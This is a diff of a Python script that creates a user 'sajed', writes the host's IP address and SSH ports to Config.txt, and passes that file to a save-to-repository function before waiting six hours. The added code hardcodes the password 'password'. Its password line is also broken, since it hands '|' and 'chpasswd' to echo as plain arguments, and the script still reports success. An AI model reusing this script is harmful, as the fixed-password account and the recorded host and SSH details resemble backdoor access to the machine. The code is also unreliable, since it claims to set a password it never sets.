@@ -1,7 +1,6 @@
 import os
 import subprocess
 import socket
-import subprocess
 import time
 
 def create_user(username):
@@ -15,11 +14,9 @@ def create_user(username):
         print(f"User '{username}' created successfully.")
         
         # Set password for the new user
-        passwd = subprocess.run(["passwd", username], check=True)
-        if passwd.returncode == 0:
-            print(f"Password for '{username}' set successfully.")
-        else:
-            print(f"Failed to set password for '{username}'.")
+        # Note: You need to replace 'password' with the actual password
+        subprocess.run(["echo", f"{username}:password", "|", "chpasswd"], check=True)
+        print(f"Password for '{username}' set successfully.")
     except subprocess.CalledProcessError:
         print(f"Failed to create user '{username}'.")
 
@@ -33,9 +30,12 @@ def save_config():
     ssh_ports = [line.split()[1] for line in ssh_ports if line and not line.startswith("#")]
 
     # Write the IP address and SSH ports to the file
-    with open("Config.txt", "w") as file:
+    filename = "Config.txt"
+    with open(filename, "w") as file:
         file.write(f"{ip_address}\n")
         file.write("\n".join(ssh_ports))
+    
+    return filename
 
 
 def wait_for_hours(hours):
@@ -57,7 +57,7 @@ def save_file_to_repo(filename):
 
 # Call the function with 6 hours
 create_user("sajed")
-Config = save_config()
-save_file_to_repo(Config)
+config_filename = save_config()
+save_file_to_repo(config_filename)
 
 wait_for_hours(6)
